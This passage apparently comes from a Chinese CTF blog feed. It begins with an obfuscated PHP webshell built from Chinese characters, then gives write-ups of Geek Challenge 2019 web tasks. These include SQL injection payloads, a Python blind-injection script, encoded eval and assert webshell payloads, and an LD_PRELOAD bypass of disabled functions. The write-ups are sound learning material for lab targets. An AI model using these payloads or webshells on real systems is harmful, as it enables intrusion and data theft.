很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;mb_strlen($str, <span class="string">'utf-8'</span>); $i++)</span><br><span class="line">&#123;</span><br><span class="line">$st = mb_substr($str, $i,<span class="number">1</span>, <span class="string">'utf-8'</span>);</span><br><span class="line">$a = ~($st);</span><br><span class="line">$b = $a[<span class="number">1</span>];<span class="comment">#取汉字的第一位</span></span><br><span class="line"><span class="keyword">if</span>($b==$_GET[<span class="string">'a'</span>])<span class="comment">#$_GET['a']想要得到的字符</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> $st;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造webshell</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $__=[];</span></span><br><span class="line"><span class="php">    $___=[];</span></span><br><span class="line"><span class="php">    $_=$__==$___;<span class="comment">//true = 1   用作索引</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $__=~(瞰);</span></span><br><span class="line"><span class="php">    $___=$__[$_];<span class="comment">//a</span></span></span><br><span class="line"><span class="php">    $__=~(北);</span></span><br><span class="line"><span class="php">    $___.=$__[$_].$__[$_];<span class="comment">//ss</span></span></span><br><span class="line"><span class="php">    $__=~(的);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//e</span></span></span><br><span class="line"><span class="php">    $__=~(半);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//r</span></span></span><br><span class="line"><span class="php">    $__=~(拾);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//t</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $____=~(~(_));<span class="comment">//_</span></span></span><br><span class="line"><span class="php">    $__=~(说);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//P</span></span></span><br><span class="line"><span class="php">    $__=~(小);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//O</span></span></span><br><span class="line"><span class="php">    $__=~(次);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//S</span></span></span><br><span class="line"><span class="php">    $__=~(站);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//T</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $_=$$____;</span></span><br><span class="line"><span class="php">    $___($_[_]);    </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这题还没复现成功，后续会补充…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BUU刷题记录之三了，刷题果然开眼界，不过… 我好菜😐，不是那个蔡😒
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="BUU刷题" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="RCE" scheme="http://ggb0n.cool/tags/RCE/"/>
    
      <category term="SSRF" scheme="http://ggb0n.cool/tags/SSRF/"/>
    
      <category term="perl下利用open命令进行RCE" scheme="http://ggb0n.cool/tags/perl%E4%B8%8B%E5%88%A9%E7%94%A8open%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8CRCE/"/>
    
      <category term="XFF注入" scheme="http://ggb0n.cool/tags/XFF%E6%B3%A8%E5%85%A5/"/>
    
      <category term="二次注入" scheme="http://ggb0n.cool/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战题目解析</title>
    <link href="http://ggb0n.cool/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"/>
    <id>http://ggb0n.cool/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</id>
    <published>2020-02-14T08:47:09.000Z</published>
    <updated>2020-04-22T00:16:57.224Z</updated>
    
    <content type="html"><![CDATA[<p>这里是极客大挑战五个sql注入题目的解析合集，都是常用的注入姿势，入门到基础级的。<a id="more"></a></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>万能密码登录管理员账户即可，这里注意一下，万能密码用的时候注意是<strong>字符型</strong>还是<strong>整形</strong>，这个题是字符型，即：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>如果是整形，则用万能密码：</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span>' or <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>万能密码还有很多，可以参考网上的信息，这里有一个：<a href="https://www.cnblogs.com/pass-A/p/11134988.html">https://www.cnblogs.com/pass-A/p/11134988.html</a></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>考察常见的万能密码登录以及<code>union select</code>注入</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目看到是一个登录框，经过尝试发现字符型的万能密码<code>1&#39; or &#39;1&#39;=&#39;1</code>可以登录，并且在<code>username</code>和<code>password</code>处都存在注入点，然后进行常规的注入就行了。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>爆库：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin'<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat(schema_name)+from+information_schema.schemata<span class="symbol">%23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web37.png" alt=""><br>爆表名：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin'<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat(table_name)+from+information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema<span class="symbol">%3</span>Ddatabase()<span class="symbol">%20</span><span class="symbol">%23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web38.png" alt=""><br>可以看到一个表名<code>l0ve1ysq1</code>，flag应该在其中，那么就看一下这个表包含的列<br>爆列名：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin'<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat(column_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_name<span class="symbol">%3</span>D'l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span>'<span class="symbol">%20</span><span class="symbol">%23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web39.png" alt=""><br>看到存在<code>password</code>列，flag应该在其中<br>查字段：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin'<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%2</span>C<span class="number">2</span><span class="symbol">%2</span>Cgroup_concat(password)<span class="symbol">%20</span>from<span class="symbol">%20</span>l<span class="number">0</span>ve<span class="number">1</span>ysq<span class="number">1</span><span class="symbol">%23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web40.png" alt=""><br>如图，成功拿到flag。</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>考察双写绕过</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>在登陆窗口，利用万能密码的时候直接<code>1&#39; or &#39;1&#39;=&#39;1</code>发现不行，但是<code>1&#39; oorr &#39;1&#39;=&#39;1</code>可以，由此猜测考察双写绕过。<br>通过测试发现了<code>or</code>、<code>from</code>、<code>union</code>、<code>select</code>、<code>where</code>被替换为空了，因此需要利用双写绕过。</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>首先利用双写爆库：</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin' uniounionn selecselectt <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.schemata%<span class="number">20</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web44.png" alt=""><br>然后爆表名：</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin' uniounionn selecselectt <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.tables%<span class="number">20</span>whwhereere%<span class="number">20</span>table_schema%<span class="number">3</span>Ddatabase()%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web45.png" alt=""><br>爆列名：</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin' uniounionn selecselectt <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.columns%<span class="number">20</span>whwhereere%<span class="number">20</span>table_name%<span class="number">3</span>D'b4bsql'%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web46.png" alt=""><br>拿flag：</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin' uniounionn selecselectt <span class="number">1</span>,<span class="number">2</span>,group_concat(passwoorrd)%<span class="number">20</span>frfromom%<span class="number">20</span>b4bsql%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web47.png" alt=""></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>主要考察报错注入，同时还考察对空格过滤的绕过，以及利用<code>left</code>和<code>right</code>截取函数读取完整flag。<br>关于报错注入的讲解，我的博客里还有，在标签里可以找到。</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>本题学到了一个新点：<strong>用<code>^</code>代替空格来连接<code>updatexml</code>函数。</strong><br>首先拿库名：</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin'^updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(database())),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><strong>注意这里的#一定要用urlencode之后的%23，否则会提示语法错误</strong>，也没搞清楚原因，可以参考一下<a href="https://blog.csdn.net/u014029795/article/details/87870976">这里</a>，建议在对url进行操作的时候还是都先编码一下。<br>拿到库名：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web77.png" alt=""><br>爆表名：</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin'^updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>这里用到了<code>like</code>，可以参考一下<a href="https://www.baidu.com/link?url=0psGCiLACYUHroOxKXx3vZ-NvkBlpmfnvv9dgXs15oRgTT0dxDlO-bMmTEZDjS35lMf1wdmCwgHlRAR8H42UX_&wd=&eqid=e87178260004a301000000035e466877">这里</a><br><img src="http://www.ggb0n.cool/images/BUUCTF-web78.png" alt=""><br>查列名</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">check</span>.php?username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="keyword">admin</span><span class="string">'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('</span>H4rDsq1<span class="string">'))),0x7e),1)</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web79.png" alt=""><br>拿flag，由于<code>updtexml</code>最多显示<code>32</code>个字符的长度，导致flag显示不全。可以用<code>substr</code>截取，但是发现<code>substr</code>被过滤了，然后参考网上学到了用<code>left</code>和<code>right</code>截取函数分两次把完整的flag查出来了。</p><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">/check.php?username=admin&amp;password=admin'^updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(left(password,<span class="number">30</span>))from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br><span class="line">/check.php?username=admin&amp;password=admin'^updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(left(password,<span class="number">30</span>))from(H4rDsq1)),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="http://www.ggb0n.cool/images/BUUCTF-web80.png" alt=""><br><img src="http://www.ggb0n.cool/images/BUUCTF-web81.png" alt=""></p><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>考察<code>布尔盲注</code></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目发现多了五个按钮，并且提示中有<code>SQL盲注</code>的字样，猜测就是考它的了。<br>这里可以的地方就是五个按钮了，点击之后发现时用<code>di</code>传参，注入点多半在这里。由于这里传的值是1-5，猜测是布尔盲注，便用常用的姿势测试一下：构造<code>id=1^1</code>和<code>id=1^0</code>发现回显不同，前者返回<code>ERROR!!!</code>(注意这里的返回跟其他错误不一样，其他错误回显是<code>ERROR!</code>)后者是<code>id=1</code>的页面，说明了就是布尔盲注。<br>关于布尔盲注可以参考<a href="https://blog.csdn.net/weixin_40709439/article/details/81355856">这里</a><br>这里需要用到的函数如下：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line"><span class="function"><span class="title">sleep</span><span class="params">(n)</span></span>：将程序挂起一段时间 n为n秒</span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(expr1,expr2,expr3)</span></span>:判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure><p>那么构造类似<code>id=1^(length(database())&gt;10)^1</code>的语句，便可以爆破出数据库名的长度，然后再利用<code>id=1^(ascii(substr((select(database())),1,1))&gt;100)^1</code>payload来爆破出数据库名，同理可以爆破出表名和最后的flag。<br>布尔盲注一般都借助python脚本来解，大致的代码逻辑是一样的，这里贴出利用二分爆破的脚本，效率比较高：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://127.0.0.1/search.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span><span class="params">(i,j)</span>:</span></span><br><span class="line">    <span class="comment"># sql = "1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1"%(i,j)                                #数据库名字          </span></span><br><span class="line">    <span class="comment"># sql = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))&gt;%d)^1"%(i,j)           #表名</span></span><br><span class="line">    <span class="comment"># sql = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))&gt;%d)^1"%(i,j)        #列名</span></span><br><span class="line">    sql = <span class="string">"1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1"</span>%(i,j)</span><br><span class="line">    data = &#123;<span class="string">"id"</span>:sql&#125;</span><br><span class="line">    r = requests.get(url,params=data)</span><br><span class="line">    <span class="comment"># print (r.url)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Click"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>) :</span><br><span class="line">        print(i,<span class="string">':'</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high :</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            res = payload(i,mid)</span><br><span class="line">            <span class="keyword">if</span> res :</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        f = int((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (f)</span></span><br><span class="line">        flag += chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(<span class="string">'flag='</span>,flag)</span><br></pre></td></tr></table></figure><p>这个题比较坑的就是要读的内容很多，flag也在后面，加上服务器性能和网络性能的原因一直读不全内容，后来多次测试，flag大概在第170个字符后面，将<code>i</code>的起始大小改一下就行了。<br>脚本也可以用于其他布尔盲注的题目，根据题目特点更改即可。</p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>考察利用PHP 7函数解析特性绕过正则巧取webshell、利用环境变量绕过functions_disable。</p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目给出如下源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"This is too Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到，需要绕过长度判断和正则，并且这个正则把所有字母和数字都在其中。查资料得知可以利用PHP 7的解析特性来绕过。</p><p><img src="http://ggb0n.cool/images/jkctf02.png" alt=""></p><p>这就说明：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">phpinfo() <span class="comment">#php5、php7可执行</span></span><br><span class="line">(phpinfo)() <span class="comment">#php7可执行</span></span><br></pre></td></tr></table></figure><p>另外，之前刷题的一篇博客写到过，我们可以利用取反<code>~</code>来绕过对字符的过滤。在php7的环境中，我们可以使用编码转换等形式，将<code>phpinfo</code>转换成一些不可见字符再传入到题目中，这样不仅绕过了正则的匹配，也成功的执行了函数，这里进行编码转换的方式有很多种，常用的有利用<code>^</code>和<code>~</code> 生成的不可见字符，这里更倾向于使用<code>~</code>求反运算符。</p><p>可以利用如下代码生成payload：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = phpinfo;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$shell);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="http://ggb0n.cool/images/jkctf03.png" alt=""></p><p>同时也可以看到禁用了很多函数，而<code>assert</code>不再其中，因此可以利用它来拿到shell，先放着。</p><p>下一步利用php的函数看一下目录：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r(scandir(<span class="string">'./'</span>));</span><br></pre></td></tr></table></figure><p>编码之后为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">8</span>F%<span class="number">8</span>D%<span class="number">96</span>%<span class="number">91</span>%<span class="number">8</span>B%A0%<span class="number">8</span>D <span class="comment"># print_r</span></span><br><span class="line">%<span class="number">8</span>C%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">91</span>%<span class="number">9</span>B%<span class="number">96</span>%<span class="number">8</span>D <span class="comment"># scandir</span></span><br></pre></td></tr></table></figure><p>构造如下payload读取当前目录内容：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;(~%8F%8D%96%91%8B%A0%8D)((~%8C%9C%9E%91%9B%96%8D)((&quot;.&#x2F;&quot;)));</span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/jkctf.png" alt=""></p><p>根目录呢？<br><img src="http://ggb0n.cool/images/jkctf04.png" alt=""></p><p>直接用<code>readfile()</code>读取<code>flag</code>文件是读不到的，因为是个二进制文件，那么就需要拿到shell执行<code>readflag</code>来拿到flag了。</p><p>而这题拿到shell可以利用前面提到的编码来获取，也可以用之前讲过的利用部分汉字异或来构造<code>POST</code>或<code>GET</code>传参来拿到shell，然后需要bypass functions_disable了。</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><p>利用如下payload拿到shell：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure><p>然后蚁剑连上，接下来就是利用环境变量bypass了，最近在不断收集bypass的exp，今天又找到<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">一个</a>。</p><p>我们把exp中的<code>bypass_disablefunc_x64.so</code>和<code>bypass_disablefunc.php</code>写入到<code>/var/tmp</code>路径下，然后利用如下payload访问：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;result&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><p><img src="http://ggb0n.cool/images/jkctf01.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里是极客大挑战五个sql注入题目的解析合集，都是常用的注入姿势，入门到基础级的。
    
    </summary>
    
    
      <category term="CTF学习记录" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
      <category term="BUU刷题" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/"/>
    
      <category term="SQL注入" scheme="http://ggb0n.cool/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/BUU%E5%88%B7%E9%A2%98/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/tags/CTF/"/>
    
      <category term="web" scheme="http://ggb0n.cool/tags/web/"/>
    
      <category term="SQL注入" scheme="http://ggb0n.cool/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="布尔盲注" scheme="http://ggb0n.cool/tags/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    
      <category term="报错注入" scheme="http://ggb0n.cool/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
      <category term="巧取webshell" scheme="http://ggb0n.cool/tags/%E5%B7%A7%E5%8F%96webshell/"/>
    
      <category term="bypass functions_disable" scheme="http://ggb0n.cool/tags/bypass-functions-disable/"/>
    
      <category term="双写注入" scheme="http://ggb0n.cool/tags/%E5%8F%8C%E5%86%99%E6%B3%A8%E5%85%A5/"/>
    
